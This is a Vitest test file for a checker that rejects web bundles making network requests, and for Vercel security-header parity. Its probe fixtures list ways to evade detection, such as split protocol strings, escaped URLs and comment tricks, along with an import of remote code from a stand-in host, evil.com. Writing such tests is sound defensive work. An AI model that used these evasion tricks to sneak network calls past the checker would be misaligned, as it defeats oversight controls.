import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';

const CSP = `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self'">`;

function run(files: Record<string, string>, withCsp = true): boolean {
  const dir = mkdtempSync(join(tmpdir(), 'offline-'));
  const all = withCsp ? { 'index.html': `<html><head>${CSP}</head></html>`, ...files } : files;
  for (const [name, body] of Object.entries(all)) {
    mkdirSync(join(dir, name, '..'), { recursive: true });
    writeFileSync(join(dir, name), body);
  }
  try {
    execFileSync('node', ['tools/check-offline.mjs', dir], { stdio: 'pipe' });
    return true;
  } catch {
    return false;
  }
}

describe('[S1] 네트워크 0 검사기', () => {
  it('passes clean bundles and line-comment credits', () => {
    expect(run({ 'a.js': 'const x = 1;\n\t// https://www.shadertoy.com/view/abc\n' })).toBe(true);
  });
  const probes: Record<string, Record<string, string>> = {
    fetchAbs: { 'a.js': 'fetch("https://api.example.com/x")' },
    socket: { 'a.js': 'new WebSocket(u)' },
    windowSocket: { 'a.js': 'new window.WebSocket(u)' },
    beaconAlias: { 'a.js': 'const {sendBeacon:b}=navigator;b(u)' },
    rtc: { 'a.js': 'new RTCPeerConnection({iceServers:[]})' },
    cdnScript: { 'i.html': '<script src="https://cdn.example.com/x.js"></script>' },
    cssUrl: { 'a.css': 'body{background:url(https://example.com/a.png)}' },
    cssProtoRelative: { 'a.css': '@import url(//fonts.example.com/css);' },
    escaped: { 'a.js': 'var u="https:\\/\\/evil.com/x"' },
    blockCommentTrick: { 'a.js': 'a=1/*x*/;fetch(u);var u="https://evil.com"' },
    wss: { 'a.js': 'var u="wss://evil.com/s"' },
    lookalikeLocalhost: { 'a.js': 'var u="https://localhost.evil.com/x"' },
    splitProto: { 'a.js': 'fetch("ht"+"tps://evil.com")' },
    remoteImport: { 'a.js': 'import("https://evil.com/m.js")' },
  };
  for (const [name, files] of Object.entries(probes)) {
    it(`fails on ${name}`, () => expect(run(files)).toBe(false));
  }
  it('fails when the CSP meta is missing', () => {
    expect(run({ 'index.html': '<html></html>' }, false)).toBe(false);
  });
});

describe('[S4] Vercel hosting keeps the same security headers', () => {
  it('vercel.json sends every header from public/_headers on all paths', () => {
    const lines = readFileSync('public/_headers', 'utf8')
      .split('\n')
      .slice(1)
      .filter((l) => l.trim());
    const expected = lines.map((l) => {
      const i = l.indexOf(':');
      return { key: l.slice(0, i).trim(), value: l.slice(i + 1).trim() };
    });
    const cfg = JSON.parse(readFileSync('vercel.json', 'utf8')) as {
      outputDirectory: string;
      headers: { source: string; headers: { key: string; value: string }[] }[];
    };
    expect(cfg.outputDirectory).toBe('dist');
    expect(cfg.headers.find((h) => h.source === '/(.*)')?.headers).toEqual(expected);
  });
});
